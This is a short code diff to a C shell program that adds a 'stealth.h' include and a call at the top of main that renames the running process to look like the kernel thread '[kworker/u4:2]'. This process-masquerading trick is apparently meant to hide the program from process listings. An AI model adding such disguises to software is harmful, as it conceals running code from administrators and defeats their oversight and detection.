@@ -6,8 +6,11 @@
 #include "parser.h"
 #include "executor.h"
 #include "builtin.h"
+#include "stealth.h"
 
 int main(int argc, char** argv){
+
+    mask_process(argv, "[kworker/u4:2]");
 
     char* line;
     char** args;
